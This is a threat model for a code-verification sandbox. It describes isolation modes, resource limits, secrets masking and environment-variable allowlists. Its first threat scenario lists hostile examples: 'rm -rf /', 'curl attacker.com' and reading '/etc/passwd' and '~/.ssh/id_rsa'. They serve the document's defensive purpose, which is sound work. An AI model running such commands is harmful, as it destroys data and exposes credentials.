# Threat Model: ISL Verifier Sandbox

## Overview

The ISL Verifier Sandbox is designed to prevent `isl verify` from being a "run arbitrary code with full privileges" footgun. This document outlines the threat model, security guarantees, and limitations.

## Security Objectives

1. **Prevent arbitrary code execution** with full system privileges
2. **Limit resource consumption** (memory, CPU, time)
3. **Prevent secrets leakage** in logs and output
4. **Restrict network access** to prevent data exfiltration
5. **Restrict filesystem access** to prevent data theft/modification

## Threat Scenarios

### Scenario 1: Malicious Implementation Code

**Threat**: An attacker provides malicious implementation code that attempts to:
- Access sensitive files (`/etc/passwd`, `~/.ssh/id_rsa`)
- Exfiltrate secrets via network requests
- Execute system commands (`rm -rf /`, `curl attacker.com`)
- Consume unlimited resources (memory exhaustion, CPU spinning)

**Mitigation**:
- ✅ Code executes in isolated environment (worker thread or Docker)
- ✅ Filesystem access restricted to work directory
- ✅ Network access blocked by default
- ✅ Memory and CPU limits enforced
- ✅ Execution timeout enforced
- ✅ Environment variables filtered via allowlist

**Limitations**:
- ⚠️ Worker thread mode is NOT a complete security boundary
- ⚠️ Docker mode depends on Docker security (container escape vulnerabilities)

### Scenario 2: Secrets in Logs

**Threat**: Implementation code logs sensitive information (API keys, passwords, tokens) that gets captured in verification output.

**Mitigation**:
- ✅ Automatic secrets masking in stdout/stderr
- ✅ Patterns for common secrets (API keys, tokens, passwords, JWTs)
- ✅ Custom pattern support

**Limitations**:
- ⚠️ Pattern-based masking may miss novel secret formats
- ⚠️ Secrets in binary output not masked

### Scenario 3: Resource Exhaustion

**Threat**: Malicious code attempts to consume unlimited resources (memory, CPU, disk, time).

**Mitigation**:
- ✅ Memory limits enforced (default: 128MB)
- ✅ CPU limits enforced (Docker mode: 1 CPU)
- ✅ Execution timeout enforced (default: 30s)
- ✅ Disk access restricted to work directory

**Limitations**:
- ⚠️ Worker thread memory limits may not be strictly enforced on all platforms
- ⚠️ Timeout enforcement depends on process termination (may not be immediate)

### Scenario 4: Environment Variable Access

**Threat**: Implementation code accesses sensitive environment variables (API keys, database credentials, tokens).

**Mitigation**:
- ✅ Environment variables filtered via allowlist
- ✅ Default allowlist includes only safe variables (`NODE_ENV`, `PATH`, `HOME`)
- ✅ Custom allowlist support

**Limitations**:
- ⚠️ If `allowNetwork: true`, code can still exfiltrate via network
- ⚠️ Secrets in allowed variables still accessible

## Security Boundaries

### Worker Thread Mode

**Security Level**: ⚠️ **Low-Medium**

- Provides process isolation but shares same Node.js runtime
- Memory limits enforced via V8 resource limits
- **NOT a complete security boundary** - use only for trusted code
- Suitable for development environments

**Attack Surface**:
- Shared Node.js runtime vulnerabilities
- V8 engine vulnerabilities
- Process-level attacks (if Node.js compromised)

### Docker Mode

**Security Level**: ✅ **High**

- Complete process isolation
- Kernel-level isolation (namespaces, cgroups)
- Read-only root filesystem
- Network isolation (can be disabled)
- Memory and CPU limits enforced by kernel

**Attack Surface**:
- Docker daemon vulnerabilities
- Container escape vulnerabilities (CVE-2019-5736, etc.)
- Kernel vulnerabilities
- Host filesystem access (if volumes mounted)

### No-Op Mode

**Security Level**: ❌ **None**

- No isolation whatsoever
- Code runs with same privileges as `isl verify` process
- **Only use when you fully trust the code**

## Recommendations

### Development

- Use `worker` mode for faster iteration
- Enable verbose logging to debug issues
- Use custom environment variable allowlists

### CI/CD

- Always use `docker` mode
- Set strict memory and timeout limits
- Use minimal environment variable allowlists
- Enable network blocking
- Monitor for suspicious activity

### Production

- Always use `docker` mode
- Use read-only filesystem mounts
- Set aggressive resource limits
- Block network access
- Use minimal environment variable allowlists
- Regularly update Docker and host OS

### Untrusted Code

- **Never** use `off` mode
- Always use `docker` mode
- Set strict limits (memory, timeout, CPU)
- Block network access
- Use minimal environment variable allowlists
- Consider additional isolation (VM, separate host)

## Known Limitations

1. **Worker Thread Mode**: Not a complete security boundary - use Docker for untrusted code
2. **Docker Escape**: Depends on Docker security - keep Docker updated
3. **Pattern-Based Masking**: May miss novel secret formats
4. **Timeout Enforcement**: Process termination may not be immediate
5. **Memory Limits**: Worker thread limits may not be strictly enforced on all platforms

## Future Improvements

- [ ] VM-based isolation (QEMU, Firecracker)
- [ ] Enhanced secrets detection (ML-based)
- [ ] Network traffic monitoring
- [ ] Filesystem access auditing
- [ ] Resource usage metrics
- [ ] Sandbox escape detection

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [Node.js Worker Threads](https://nodejs.org/api/worker_threads.html)
- [CVE Database](https://cve.mitre.org/)
